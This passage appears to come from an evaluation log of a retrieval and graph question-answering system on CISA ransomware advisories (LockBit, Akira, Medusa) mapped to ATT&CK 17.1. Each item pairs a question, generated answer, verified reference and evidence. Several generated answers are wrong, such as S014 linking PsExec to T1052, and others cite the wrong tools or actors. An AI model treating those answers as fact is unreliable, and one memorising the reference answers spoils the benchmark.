Finds open Transmission Control Protocol (TCP) and User Data Protocol (UDP) ports for exploitation.
T1046
Network Service Discovery
[E2; CISA]
Table 4: Freeware and Open-Source Tools Used by LockBit Affiliates
[E3; CISA]
Tool
Intended Use
Repurposed Use by LockBit Affiliates
MITRE ATT&CK ID

[E4; CISA]
AnyDesk
Enables remote connections to network devices.
Enables remote control of victim’s network devices.
T1219
Remote Access Software
[E5; CISA]

ID
Use
Network Service Discovery
T1046
LockBit affiliates use SoftPerfect Network Scanner, Advanced IP Scanner, or Advanced Port Scanner to scan target networks.
LockBit affiliates may use SoftPerfect Network Scanner, Advanced Port Scanner, and AdFind to enumerate connected machines in the network.
System Information Discovery
T1082
LockBit affiliates will enumerate system information to include hostname, host configuration, domain information, local drive configuration, remote shares, and mounted external storage devices.
System Location Discovery: System Language Discovery
T1614.001
LockBit 3.0 will not infect machines with language settings that match a defined exclusion list.
Table 12: LockBit Affiliates’ ATT&CK Techniques for Enterprise – Lateral Movement
Technique Title
ID
Use
Lateral Movement
TA0008
LockBit affiliates will laterally move 
[E6; CISA]
Understanding Ransomware Threat Actors: LockBit
[E7; CISA]
TECHNICAL DETAILS
[E8; CISA]
Table 11: LockBit Affiliates’ ATT&CK Techniques for Enterprise – Discovery
[E9; CISA]
Atera Remote Monitoring & Management (RMM)
Enables remote connections to network devices.
Enables remote control of victim’s network devices.
T1219
Remote Access Software
[E10; ATTACK]
Use network intrusion detection/prevention systems to detect and prevent remote service scans.
[E11; ATTACK]
ATT&CK release: 17.1
Technique: Network Service Discovery (T1046)
Mitigation: Network Intrusion Prevention (M1031)
GRAPH NODES
GRAPH PATHS

## S011

Question: What is the two-hop relationship from LockBit affiliates through Advanced Internet Protocol (IP) Scanner to an ATT&CK technique in this advisory? Explain both the software-use link and the technique mapping.

Outcome: failed

Answer:

[No valid answer was produced.]

Verified reference:

The advisory lists Advanced Internet Protocol (IP) Scanner among tools used by LockBit affiliates and associates its repurposed use with T1046 (Network Service Discovery in the frozen Enterprise ATT&CK 17.1 reference). This describes the advisory mapping, not all uses of that tool.

Supplied evidence (verbatim generator context):

SOURCE PASSAGES
[E1; CISA]
Advanced Port Scanner
Performs network scans.
Finds open Transmission Control Protocol (TCP) and User Data Protocol (UDP) ports for exploitation.
T1046
Network Service Discovery
[E2; CISA]
Table 4: Freeware and Open-Source Tools Used by LockBit Affiliates
[E3; CISA]
Tool
Intended Use
Repurposed Use by LockBit Affiliates
MITRE ATT&CK ID

[E4; ATTACK]
ATT&CK release: 17.1
Technique: Network Service Discovery (T1046)
Mitigation: Network Segmentation (M1030)
[E5; ATTACK]
Ensure proper network segmentation is followed to protect critical servers and devices.
[E6; CISA]
AnyDesk
Enables remote connections to network devices.
Enables remote control of victim’s network devices.
T1219
Remote Access Software
[E7; ATTACK]
ATT&CK release: 17.1
Technique: Remote Access Tools (T1219)
Mitigation: Network Intrusion Prevention (M1031)
[E8; ATTACK]
Network intrusion detection and prevention systems that use network signatures may be able to prevent traffic to remote access services.
[E9; CISA]
Atera Remote Monitoring & Management (RMM)
Enables remote connections to network devices.
Enables remote control of victim’s network devices.
T1219
Remote Access Software
[E10; CISA]
Backstab
Terminates antimalware-protected processes.
Terminates endpoint detection and response (EDR)- protected processes.
T1562.001
Impair Defenses: Disable or Modify Tools
[E11; ATTACK]
ATT&CK release: 17.1
Technique: Disable or Modify Tools (T1562.001)
Mitigation: User Account Management (M1018)
[E12; ATTACK]
Ensure proper user permissions are in place to prevent adversaries from disabling or interfering with security services.
[E13; CISA]
LockBit affiliates have used Mimikatz to dump credentials.
[E14; CISA]
Understanding Ransomware Threat Actors: LockBit
[E15; CISA]
TECHNICAL DETAILS
[E16; CISA]
Table 9: LockBit Affiliates’ ATT&CK Techniques for Enterprise – Defense Evasion
[E17; ATTACK]
Use network intrusion detection/prevention systems to detect and prevent remote service scans.
[E18; ATTACK]
ATT&CK release: 17.1
Technique: Network Service Discovery (T1046)
Mitigation: Network Intrusion Prevention (M1031)
GRAPH NODES
N1: LockBit affiliates
N2: Advanced Port Scanner
N3: Network Service Discovery (T1046)
N4: Network Segmentation (M1030)
N5: AnyDesk
N6: Remote Access Tools (T1219)
N7: Network Intrusion Prevention (M1031)
N8: Atera Remote Monitoring & Management (RMM)
N9: Backstab
N10: Disable or Modify Tools (T1562.001)
N11: User Account Management (M1018)
N12: Mimikatz (S0002)
GRAPH PATHS
P1: N1 --USES[E1,E2,E3]--> N2 --USES_TECHNIQUE[E1,E2,E3]--> N3 --MITIGATED_BY[E4,E5]--> N4
P2: N1 --USES[E6,E2,E3]--> N5 --USES_TECHNIQUE[E6,E2,E3]--> N6 --MITIGATED_BY[E7,E8]--> N7
P3: N1 --USES[E9,E2,E3]--> N8 --USES_TECHNIQUE[E9,E2,E3]--> N6 --MITIGATED_BY[E7,E8]--> N7
P4: N1 --USES[E10,E2,E3]--> N9 --USES_TECHNIQUE[E10,E2,E3]--> N10 --MITIGATED_BY[E11,E12]--> N11
P5: N1 --USES[E13,E14,E15,E16]--> N12

## S012

Question: In the AA24-109A command-and-control paragraph describing ngrok encrypted sessions that bypass perimeter monitoring, what two-hop path connects Akira actors through ngrok to the cited ATT&CK technique? Explain both source-supported links.

Outcome: answer_ready_for_review

Answer:

Akira threat actors use ngrok to create secure tunnels for data exfiltration, which is a technique described as Protocol Tunneling (T1572). [E1, E2, E3]
Ngrok is used by Akira threat actors to connect to exfiltration servers, which involves using Protocol Tunneling (T1572). [E8, E2, E3]
The ATT&CK technique Protocol Tunneling (T1572) is mitigated by filtering network traffic to untrusted or known bad domains and resources. [E4, E5]
Network intrusion detection and prevention systems can be used to mitigate activity at the network level by identifying traffic for specific adversary malware. [E6, E7]
The ATT&CK technique Protocol Tunneling (T1572) is mitigated by Network Intrusion Prevention (M1031). [E6, E7]
Akira threat actors use ngrok to create secure tunnels for data exfiltration, which is a two-hop path connecting them to the ATT&CK technique Protocol Tunneling (T1572). [E1, E2, E3, E8]
The ATT&CK technique Inhibit System Recovery (T1490) is mitigated by limiting the user accounts that have access to backups to only those required. [E11, E12]
Akira’s encryptor (w.exe) uses PowerShell commands to delete Volume Shadow Copy Service (VSS) copies on Windows systems, which is a technique described as Inhibit System Recovery (T1490). [E10, E2, E3]

Verified reference:

In the C2 paragraph of AA24-109A, Akira actors use ngrok to initiate encrypted sessions that bypass perimeter monitoring. That paragraph cites T1572 (Protocol Tunneling). The path is Akira actors → USES → ngrok → USES_TECHNIQUE → T1572.

Supplied evidence (verbatim generator context):

SOURCE PASSAGES
[E1; CISA]
The authoring organizations observed Akira threat actors establishing command and control (C2) communications by using tunneling utilities, such as Ngrok [T1572]
[E2; CISA]
#StopRansomware: Akira Ransomware
[E3; CISA]
Technical Details
[E4; ATTACK]
ATT&CK release: 17.1
Technique: Protocol Tunneling (T1572)
Mitigation: Filter Network Traffic (M1037)
[E5; ATTACK]
Consider filtering network traffic to untrusted or known bad domains and resources. 
[E6; ATTACK]
ATT&CK release: 17.1
Technique: Protocol Tunneling (T1572)
Mitigation: Network Intrusion Prevention (M1031)
[E7; ATTACK]
Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. 
[E8; CISA]
In some instances, Akira threat actors use Ngrok to create secure tunnels for data exfiltration [T1090].
[E9; CISA]
 such as File Transfer Protocol (FTP), Secure File Transfer Protocol (SFTP), and cloud storage services like Mega [T1537], to connect to exfiltration servers. In some instances, Akira threat actors use Ngrok to create secure tunnels for data exfiltration [T1090].
After exfiltrating data, Akira threat actors use a double-extortion model [T1657], which involves threat actors both encrypting systems [T1486] and threatening to leak sensitive information. The Akira ransom note provides each company with a unique code and instructions to contact the threat actors via a .onion URL, which is accessible through the Tor network [T1090.003][T1573.002].
(Note: Tor, short for The Onion Router, is a decentralized network designed to anonymize internet traffic by routing it through multiple servers, encrypting data at each step. This network is often leveraged by threat actors to conceal their identities and activities, enabling secure and 
[E10; CISA]
To further inhibit system recovery and impede forensic analysis, Akira’s encryptor (w.exe) uses PowerShell commands to delete Volume Shadow Copy Service (VSS) copies on Windows systems [T1490].
[E11; ATTACK]
ATT&CK release: 17.1
Technique: Inhibit System Recovery (T1490)
Mitigation: User Account Management (M1018)
[E12; ATTACK]
Limit the user accounts that have access to backups to only those required. In AWS environments, consider using Service Control Policies to restrict API calls to delete backups, snapshots, and images. 
GRAPH NODES
N1: ngrok (S0508)
N2: Protocol Tunneling (T1572)
N3: Filter Network Traffic (M1037)
N4: Network Intrusion Prevention (M1031)
N5: Akira threat actors
N6: Akira (S1129)
N7: Inhibit System Recovery (T1490)
N8: User Account Management (M1018)
GRAPH PATHS
P1: N1 --USES_TECHNIQUE[E1,E2,E3]--> N2 --MITIGATED_BY[E4,E5]--> N3
P2: N1 --USES_TECHNIQUE[E1,E2,E3]--> N2 --MITIGATED_BY[E6,E7]--> N4
P3: N5 --USES[E8,E2,E3]--> N1
P4: N6 --USES_TECHNIQUE[E10,E2,E3]--> N7 --MITIGATED_BY[E11,E12]--> N8

## S013

Question: Compare AA24-109A and AA23-352A: which actors are reported using Mimikatz, and how do their advisory software-to-technique mappings compare? Cite both reports and keep each mapping within its source context.

Outcome: answer_ready_for_review

Answer:

LockBit affiliates use Mimikatz. [E1, E2, E3, E4]
Volt Typhoon actors use Mimikatz to harvest credentials. [E5, E6]
Phobos actors use Mimikatz to export credentials. [E8, E9, E10, E11]
Akira threat actors use Mimikatz to dump credentials. [E12, E13, E14, E15]
Black Basta affiliates use Mimikatz for privilege escalation. [E16, E17, E18, E19]
Medusa actors use Mimikatz to access credential material. [E20, E21, E22, E23]
LockBit and Phobos actors use Mimikatz for defense evasion. [E4, E11]
Volt Typhoon actors use Impacket in addition to Mimikatz. [E5, E6]

Verified reference:

AA24-109A reports Akira threat actors using Mimikatz, with advisory mappings T1003; AA23-352A reports Play ransomware actors using Mimikatz, with advisory mappings T1003. These mappings describe the cited reports and do not establish that every use of the software has these behaviors. Both reports cite the same parent technique, T1003 (OS Credential Dumping), for their reported Mimikatz use.

Supplied evidence (verbatim generator context):

SOURCE PASSAGES
[E1; CISA]
LockBit affiliates have used Mimikatz to dump credentials.
[E2; CISA]
Understanding Ransomware Threat Actors: LockBit
[E3; CISA]
TECHNICAL DETAILS
[E4; CISA]
Table 9: LockBit Affiliates’ ATT&CK Techniques for Enterprise – Defense Evasion
[E5; CISA]
The U.S. authoring agencies have observed Volt Typhoon actors leveraging Mimikatz to harvest credentials, and industry partners have observed Volt Typhoon leveraging Impacket.[2]
[E6; CISA]
PRC State-Sponsored Actors Compromise and Maintain Persistent Access to U.S. Critical Infrastructure
[E7; CISA]
TECHNICAL DETAILS
[E8; CISA]
Phobos actors used Mimikatz to export credentials.
[E9; CISA]
#StopRansomware: Phobos Ransomware
[E10; CISA]
TECHNICAL DETAILS
[E11; CISA]
Table 16: Phobos Threat Actors ATT&CK Techniques for Enterprise – Defense Evasion
[E12; CISA]
Akira threat actors use tools like Mimikatz and LaZagne to dump credentials.
[E13; CISA]
#StopRansomware: Akira Ransomware
[E14; CISA]
Technical Details
[E15; CISA]
Table 14. Defense Evasion
[E16; CISA]
Black Basta affiliates use credential scraping tools like Mimikatz for privilege escalation.
[E17; CISA]
#StopRansomware: Black Basta
[E18; CISA]
Technical Details
[E19; CISA]
Table 1: Tools Used by Black Basta Affiliates
[E20; CISA]
Medusa actors access credential material stored in process memory or LSASS using Mimikatz.
[E21; CISA]
#StopRansomware: Medusa Ransomware
[E22; CISA]
Technical Details
[E23; CISA]
Table 3: Initial Access
GRAPH NODES
N1: LockBit affiliates
N2: Mimikatz (S0002)
N3: Volt Typhoon actors
N4: Phobos actors
N5: Akira threat actors
N6: Black Basta affiliates
N7: Medusa actors
GRAPH PATHS
P1: N1 --USES[E1,E2,E3,E4]--> N2
P2: N3 --USES[E5,E6,E7]--> N2
P3: N4 --USES[E8,E9,E10,E11]--> N2
P4: N5 --USES[E12,E13,E14,E15]--> N2
P5: N6 --USES[E16,E17,E18,E19]--> N2
P6: N7 --USES[E20,E21,E22,E23]--> N2

## S014

Question: According to AA25-071A, which ATT&CK technique is connected to Medusa actors through the reported use of PsExec? Explain the two-hop actor-to-software-to-technique path with evidence.

Outcome: answer_ready_for_review

Answer:

Medusa actors use PsExec to connect to a remote system. [E1, E2, E3]
The ATT&CK technique connected to Medusa actors through PsExec is T1052. [E1, E2, E3]

Verified reference:

Medusa actors use PsExec; the advisory associates the described use of PsExec with T1569.002 (Service Execution in Enterprise ATT&CK 17.1). Both links must be supported in the advisory context.

Supplied evidence (verbatim generator context):

SOURCE PASSAGES
[E1; CISA]
When provided with valid username and password credentials, Medusa actors use PsExec to:
[E2; CISA]
#StopRansomware: Medusa Ransomware
[E3; CISA]
Technical Details
GRAPH NODES
N1: Medusa actors
N2: PsExec (S0029)
GRAPH PATHS
P1: N1 --USES[E1,E2,E3]--> N2

## S015

Question: Which mitigation options have direct, active mitigates relationships in Enterprise ATT&CK 17.1 to the technique mapped to Advanced Internet Protocol (IP) Scanner in AA23-165A? Start from LockBit affiliates and follow the three-hop actor-to-software-to-technique-to-mitigation path. Distinguish advisory observations from reference recommendations.

Outcome: answer_ready_for_review

Answer:

LockBit affiliates' AnyDesk enables remote connections to network devices, which is mitigated by Network Intrusion Prevention (M1031). [E1, E2, E3, E4]
LockBit affiliates' Atera Remote Monitoring & Management (RMM) enables remote connections to network devices, which is mitigated by Network Intrusion Prevention (M1031). [E6, E2, E3, E4]
Network Service Discovery (T1046) is mitigated by Network Segmentation (M1030). [E8, E9]
LockBit affiliates' Backstab terminates antimalware-protected processes, which is mitigated by User Account Management (M1018). [E10, E11, E12]

Verified reference:

The AA23-165A Table 4 caption lists Advanced Internet Protocol (IP) Scanner as a tool used by LockBit affiliates. The selected advisory row maps its reported use to T1046 (Network Service Discovery). The direct, active mitigates relationships in Enterprise ATT&CK 17.1 connect this technique to: M1030 (Network Segmentation), M1031 (Network Intrusion Prevention), M1042 (Disable or Remove Feature or Program). These are reference mitigation associations, not incident-specific proof of effectiveness.

Supplied evidence (verbatim generator context):

SOURCE PASSAGES
[E1; CISA]
AnyDesk
Enables remote connections to network devices.
Enables remote control of victim’s network devices.
T1219
Remote Access Software
[E2; CISA]
Table 4: Freeware and Open-Source Tools Used by LockBit Affiliates
[E3; CISA]
Tool
Intended Use
Repurposed Use by LockBit Affiliates
MITRE ATT&CK ID

[E4; ATTACK]
ATT&CK release: 17.1
Technique: Remote Access Tools (T1219)
Mitigation: Network Intrusion Prevention (M1031)
[E5; ATTACK]
Network intrusion detection and prevention systems that use network signatures may be able to prevent traffic to remote access services.
[E6; CISA]
Atera Remote Monitoring & Management (RMM)
Enables remote connections to network devices.
Enables remote control of victim’s network devices.
T1219
Remote Access Software
[E7; CISA]
Advanced Port Scanner
Performs network scans.
Finds open Transmission Control Protocol (TCP) and User Data Protocol (UDP) ports for exploitation.
T1046
Network Service Discovery
[E8; ATTACK]
ATT&CK release: 17.1
Technique: Network Service Discovery (T1046)
Mitigation: Network Segmentation (M1030)
[E9; ATTACK]
Ensure proper network segmentation is followed to protect critical servers and devices.
[E10; CISA]
Backstab
Terminates antimalware-protected processes.
Terminates endpoint detection and response (EDR)- protected processes.
T1562.001
Impair Defenses: Disable or Modify Tools
[E11; ATTACK]
ATT&CK release: 17.1
Technique: Disable or Modify Tools (T1562.001)
Mitigation: User Account Management (M1018)
[E12; ATTACK]
Ensure proper user permissions are in place to prevent adversaries from disabling or interfering with security services.
[E13; CISA]
LockBit affiliates have used Mimikatz to dump credentials.
[E14; CISA]
Understanding Ransomware Threat Actors: LockBit
[E15; CISA]
TECHNICAL DETAILS
[E16; CISA]
Table 9: LockBit Affiliates’ ATT&CK Techniques for Enterprise – Defense Evasion
[E17; ATTACK]
Use network intrusion detection/prevention systems to detect and prevent remote service scans.
[E18; ATTACK]
ATT&CK release: 17.1
Technique: Network Service Discovery (T1046)
Mitigation: Network Intrusion Prevention (M1031)
GRAPH NODES
N1: LockBit affiliates
N2: AnyDesk
N3: Remote Access Tools (T1219)
N4: Network Intrusion Prevention (M1031)
N5: Atera Remote Monitoring & Management (RMM)
N6: Advanced Port Scanner
N7: Network Service Discovery (T1046)
N8: Network Segmentation (M1030)
N9: Backstab
N10: Disable or Modify Tools (T1562.001)
N11: User Account Management (M1018)
N12: Mimikatz (S0002)
GRAPH PATHS
P1: N1 --USES[E1,E2,E3]--> N2 --USES_TECHNIQUE[E1,E2,E3]--> N3 --MITIGATED_BY[E4,E5]--> N4
P2: N1 --USES[E6,E2,E3]--> N5 --USES_TECHNIQUE[E6,E2,E3]--> N3 --MITIGATED_BY[E4,E5]--> N4
P3: N1 --USES[E7,E2,E3]--> N6 --USES_TECHNIQUE[E7,E2,E3]--> N7 --MITIGATED_BY[E8,E9]--> N8
P4: N1 --USES[E10,E2,E3]--> N9 --USES_TECHNIQUE[E10,E2,E3]--> N10 --MITIGATED_BY[E11,E12]--> N11
P5: N1 --USES[E13,E14,E15,E16]--> N12

## S016

Question: In the AA24-109A command-and-control paragraph describing ngrok encrypted sessions that bypass perimeter monitoring, what two-hop path connects Akira actors through ngrok to the cited ATT&CK technique? Explain both source-supported links.

Outcome: answer_ready_for_review

Answer:

Akira threat actors use ngrok to create secure tunnels for data exfiltration. [E6, E2, E3]
Ngrok is used by Akira threat actors to bypass perimeter monitoring. [E1, E2, E3]
The two-hop path connecting Akira actors through ngrok to Protocol Tunneling (T1572) is: ngrok (N1) --USES_TECHNIQUE--> Protocol Tunneling (T1572) (N2). [E1, E2, E3, E10]
The two-hop path connecting Akira actors through ngrok to Protocol Tunneling (T1572) is: Akira threat actors (N4) --USES--> ngrok (N1) --USES_TECHNIQUE--> Protocol Tunneling (T1572) (N2). [E6, E2, E3, E1]
Network Intrusion Prevention (M1031) can be used to mitigate Protocol Tunneling (T1572). [E4, E5]
Network Intrusion Prevention (M1031) uses network signatures to identify traffic for specific adversary malware. [E4, E5]
Filter Network Traffic (M1037) can be used to mitigate Protocol Tunneling (T1572). [E10, E11]
Filter Network Traffic (M1037) considers filtering network traffic to untrusted or known bad domains and resources. [E10, E11]

Verified reference:

In the C2 paragraph of AA24-109A, Akira actors use ngrok to initiate encrypted sessions that bypass perimeter monitoring. That paragraph cites T1572 (Protocol Tunneling). The path is Akira actors → USES → ngrok → USES_TECHNIQUE → T1572.

Supplied evidence (verbatim generator context):

SOURCE PASSAGES
[E1; CISA]
The authoring organizations observed Akira threat actors establishing command and control (C2) communications by using tunneling utilities, such as Ngrok [T1572]
[E2; CISA]
#StopRansomware: Akira Ransomware
[E3; CISA]
Technical Details
[E4; ATTACK]
ATT&CK release: 17.1
Technique: Protocol Tunneling (T1572)
Mitigation: Network Intrusion Prevention (M1031)
[E5; ATTACK]
Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. 
[E6; CISA]
In some instances, Akira threat actors use Ngrok to create secure tunnels for data exfiltration [T1090].
[E7; CISA]
To further inhibit system recovery and impede forensic analysis, Akira’s encryptor (w.exe) uses PowerShell commands to delete Volume Shadow Copy Service (VSS) copies on Windows systems [T1490].
[E8; ATTACK]
ATT&CK release: 17.1
Technique: Inhibit System Recovery (T1490)
Mitigation: User Account Management (M1018)
[E9; ATTACK]
Limit the user accounts that have access to backups to only those required. In AWS environments, consider using Service Control Policies to restrict API calls to delete backups, snapshots, and images. 
[E10; ATTACK]
ATT&CK release: 17.1
Technique: Protocol Tunneling (T1572)
Mitigation: Filter Network Traffic (M1037)
[E11; ATTACK]
Consider filtering network traffic to untrusted or known bad domains and resources. 
[E12; ATTACK]
ATT&CK release: 17.1
Technique: Inhibit System Recovery (T1490)
Mitigation: Operating System Configuration (M1028)
[E13; ATTACK]
Consider technical controls to prevent the disabling of services or deletion of files involved in system recovery. Additionally, ensure that WinRE is enabled using the following command: <code>reagentc /enable</code>.(Citation: reagentc_cmd)
[E14; ATTACK]
ATT&CK release: 17.1
Technique: Inhibit System Recovery (T1490)
Mitigation: Execution Prevention (M1038)
[E15; ATTACK]
Consider using application control configured to block execution of utilities such as `diskshadow.exe` that may not be required for a given system or network to prevent potential misuse by adversaries. 
GRAPH NODES
N1: ngrok (S0508)
N2: Protocol Tunneling (T1572)
N3: Network Intrusion Prevention (M1031)
N4: Akira threat actors
N5: Akira (S1129)
N6: Inhibit System Recovery (T1490)
N7: User Account Management (M1018)
N8: Filter Network Traffic (M1037)
N9: Operating System Configuration (M1028)
N10: Execution Prevention (M1038)
GRAPH PATHS
P1: N1 --USES_TECHNIQUE[E1,E2,E3]--> N2 --MITIGATED_BY[E4,E5]--> N3
P2: N4 --USES[E6,E2,E3]--> N1
P3: N5 --USES_TECHNIQUE[E7,E2,E3]--> N6 --MITIGATED_BY[E8,E9]--> N7
P4: N1 --USES_TECHNIQUE[E1,E2,E3]--> N2 --MITIGATED_BY[E10,E11]--> N8
P5: N5 --USES_TECHNIQUE[E7,E2,E3]--> N6 --MITIGATED_BY[E12,E13]--> N9
P6: N5 --USES_TECHNIQUE[E7,E2,E3]--> N6 --MITIGATED_BY[E14,E15]--> N10

## S017

Question: In the AA24-109A command-and-control paragraph describing ngrok encrypted sessions that bypass perimeter monitoring, what two-hop path connects Akira actors through ngrok to the cited ATT&CK technique? Explain both source-supported links.

Outcome: answer_ready_for_review

Answer:

Akira threat actors use ngrok to create secure tunnels for data exfiltration. [E1, E2, E3, E8]
Ngrok is used by Akira threat actors to bypass perimeter monitoring. [E1, E2, E3]
The two-hop path connecting Akira actors through ngrok to the cited ATT&CK technique is: ngrok (N1) --USES_TECHNIQUE--> Protocol Tunneling (T1572) (N2) --MITIGATED_BY--> Filter Network Traffic (M1037) (N3). [E1, E2, E3, E4]
The two-hop path connecting Akira actors through ngrok to the cited ATT&CK technique is: ngrok (N1) --USES_TECHNIQUE--> Protocol Tunneling (T1572) (N2) --MITIGATED_BY--> Network Intrusion Prevention (M1031) (N4). [E1, E2, E3, E6]

Verified reference:

In the C2 paragraph of AA24-109A, Akira actors use ngrok to initiate encrypted sessions that bypass perimeter monitoring. That paragraph cites T1572 (Protocol Tunneling). The path is Akira actors → USES → ngrok → USES_TECHNIQUE → T1572.

Supplied evidence (verbatim generator context):

SOURCE PASSAGES
[E1; CISA]
The authoring organizations observed Akira threat actors establishing command and control (C2) communications by using tunneling utilities, such as Ngrok [T1572]
[E2; CISA]
#StopRansomware: Akira Ransomware
[E3; CISA]
Technical Details
[E4; ATTACK]
ATT&CK release: 17.1
Technique: Protocol Tunneling (T1572)
Mitigation: Filter Network Traffic (M1037)
[E5; ATTACK]
Consider filtering network traffic to untrusted or known bad domains and resources. 
[E6; ATTACK]
ATT&CK release: 17.1
Technique: Protocol Tunneling (T1572)
Mitigation: Network Intrusion Prevention (M1031)
[E7; ATTACK]
Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. 
[E8; CISA]
In some instances, Akira threat actors use Ngrok to create secure tunnels for data exfiltration [T1090].
[E9; CISA]
 such as File Transfer Protocol (FTP), Secure File Transfer Protocol (SFTP), and cloud storage services like Mega [T1537], to connect to exfiltration servers. In some instances, Akira threat actors use Ngrok to create secure tunnels for data exfiltration [T1090].
After exfiltrating data, Akira threat actors use a double-extortion model [T1657], which involves threat actors both encrypting systems [T1486] and threatening to leak sensitive information. The Akira ransom note provides each company with a unique code and instructions to contact the threat actors via a .onion URL, which is accessible through the Tor network [T1090.003][T1573.002].
(Note: Tor, short for The Onion Router, is a decentralized network designed to anonymize internet traffic by routing it through multiple servers, encrypting data at each step. This network is often leveraged by threat actors to conceal their identities and activities, enabling secure and 
[E10; CISA]
To further inhibit system recovery and impede forensic analysis, Akira’s encryptor (w.exe) uses PowerShell commands to delete Volume Shadow Copy Service (VSS) copies on Windows systems [T1490].
[E11; ATTACK]
ATT&CK release: 17.1
Technique: Inhibit System Recovery (T1490)
Mitigation: Operating System Configuration (M1028)
[E12; ATTACK]
Consider technical controls to prevent the disabling of services or deletion of files involved in system recovery. Additionally, ensure that WinRE is enabled using the following command: <code>reagentc /enable</code>.(Citation: reagentc_cmd)
GRAPH NODES
N1: ngrok (S0508)
N2: Protocol Tunneling (T1572)
N3: Filter Network Traffic (M1037)
N4: Network Intrusion Prevention (M1031)
N5: Akira threat actors
N6: Akira (S1129)
N7: Inhibit System Recovery (T1490)
N8: Operating System Configuration (M1028)
GRAPH PATHS
P1: N1 --USES_TECHNIQUE[E1,E2,E3]--> N2 --MITIGATED_BY[E4,E5]--> N3
P2: N1 --USES_TECHNIQUE[E1,E2,E3]--> N2 --MITIGATED_BY[E6,E7]--> N4
P3: N5 --USES[E8,E2,E3]--> N1
P4: N6 --USES_TECHNIQUE[E10,E2,E3]--> N7 --MITIGATED_BY[E11,E12]--> N8

## S018

Question: Which mitigation options have direct, active mitigates relationships in Enterprise ATT&CK 17.1 to the technique mapped to Advanced Internet Protocol (IP) Scanner in AA23-165A? Start from LockBit affiliates and follow the three-hop actor-to-software-to-technique-to-mitigation path. Distinguish advisory observations from reference recommendations.

Outcome: answer_ready_for_review

Answer:

LockBit affiliates use AnyDesk for remote access, which is mitigated by Network Intrusion Prevention (M1031). [E1, E2, E3, E4]
LockBit affiliates use Atera Remote Monitoring & Management (RMM) for remote access, which is mitigated by Network Intrusion Prevention (M1031). [E6, E2, E3, E4]
LockBit affiliates use Advanced Port Scanner for network service discovery, which is mitigated by Network Segmentation (M1030). [E7, E2, E3, E8]
Impacket is used by LockBit affiliates, but no direct mitigation is specified. [E10, E11, E12]
LockBit affiliates use SoftPerfect Network Scanner for network service discovery, but no direct mitigation is specified. [E15, E11, E12]
LockBit affiliates use StealBit for data exfiltration, but no direct mitigation is specified. [E19, E11, E12]

Verified reference:

The AA23-165A Table 4 caption lists Advanced Internet Protocol (IP) Scanner as a tool used by LockBit affiliates. The selected advisory row maps its reported use to T1046 (Network Service Discovery). The direct, active mitigates relationships in Enterprise ATT&CK 17.1 connect this technique to: M1030 (Network Segmentation), M1031 (Network Intrusion Prevention), M1042 (Disable or Remove Feature or Program). These are reference mitigation associations, not incident-specific proof of effectiveness.

Supplied evidence (verbatim generator context):

SOURCE PASSAGES
[E1; CISA]
AnyDesk
Enables remote connections to network devices.
Enables remote control of victim’s network devices.
T1219
Remote Access Software
[E2; CISA]
Table 4: Freeware and Open-Source Tools Used by LockBit Affiliates
[E3; CISA]
Tool
Intended Use
Repurposed Use by LockBit Affiliates
MITRE ATT&CK ID

[E4; ATTACK]
ATT&CK release: 17.1
Technique: Remote Access Tools (T1219)
Mitigation: Network Intrusion Prevention (M1031)
[E5; ATTACK]
Network intrusion detection and prevention systems that use network signatures may be able to prevent traffic to remote access services.
[E6; CISA]
Atera Remote Monitoring & Management (RMM)
Enables remote connections to network devices.
Enables remote control of victim’s network devices.
T1219
Remote Access Software
[E7; CISA]
Advanced Port Scanner
Performs network scans.
Finds open Transmission Control Protocol (TCP) and User Data Protocol (UDP) ports for exploitation.
T1046
Network Service Discovery
[E8; ATTACK]
ATT&CK release: 17.1
Technique: Network Service Discovery (T1046)
Mitigation: Network Segmentation (M1030)
[E9; ATTACK]
Ensure proper network segmentation is followed to protect critical servers and devices.
[E10; CISA]
Impacket
[E11; CISA]
Understanding Ransomware Threat Actors: LockBit
[E12; CISA]
TECHNICAL DETAILS
[E13; ATTACK]
Use network intrusion detection/prevention systems to detect and prevent remote service scans.
[E14; ATTACK]
ATT&CK release: 17.1
Technique: Network Service Discovery (T1046)
Mitigation: Network Intrusion Prevention (M1031)
[E15; CISA]
LockBit affiliates use SoftPerfect Network Scanner, Advanced IP Scanner, or Advanced Port Scanner to scan target networks.
[E16; CISA]
Table 11: LockBit Affiliates’ ATT&CK Techniques for Enterprise – Discovery
[E17; ATTACK]
This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls.
[E18; ATTACK]
ATT&CK release: 17.1
Technique: Develop Capabilities (T1587)
Mitigation: Pre-compromise (M1056)
[E19; CISA]
LockBit affiliates use StealBit, a custom exfiltration tool first used with LockBit 2.0, to steal data from a target network.
[E20; CISA]
Table 14: LockBit Affiliates’ ATT
GRAPH NODES
N1: LockBit affiliates
N2: AnyDesk
N3: Remote Access Tools (T1219)
N4: Network Intrusion Prevention (M1031)
N5: Atera Remote Monitoring & Management (RMM)
N6: Advanced Port Scanner
N7: Network Service Discovery (T1046)
N8: Network Segmentation (M1030)
N9: Impacket (S0357)
N10: SoftPerfect Network Scanner
N11: StealBit (S1200)
GRAPH PATHS
P1: N1 --USES[E1,E2,E3]--> N2 --USES_TECHNIQUE[E1,E2,E3]--> N3 --MITIGATED_BY[E4,E5]--> N4
P2: N1 --USES[E6,E2,E3]--> N5 --USES_TECHNIQUE[E6,E2,E3]--> N3 --MITIGATED_BY[E4,E5]--> N4
P3: N1 --USES[E7,E2,E3]--> N6 --USES_TECHNIQUE[E7,E2,E3]--> N7 --MITIGATED_BY[E8,E9]--> N8
P4: N1 --USES[E10,E11,E12,E2]--> N9
P5: N1 --USES[E15,E11,E12,E16]--> N10
P6: N1 --USES[E19,E11,E12,E20]--> N11

## S019

Question: What is the two-hop relationship from LockBit affiliates through Advanced Internet Protocol (IP) Scanner to an ATT&CK technique in this advisory? Explain both the software-use link and the technique mapping.

Outcome: answer_ready_for_review

Answer:

LockBit affiliates use Advanced Internet Protocol (IP) Scanner. [E5, E6, E7]
Advanced Internet Protocol (IP) Scanner is used for Network Service Discovery (T1046). [E5, E6, E7, E8]
Network Service Discovery (T1046) is mitigated by Network Segmentation (M1030). [E8, E9]
Network Segmentation (M1030) guidance is to ensure proper network segmentation is followed to protect critical servers and devices. [E8, E9]

Verified reference:

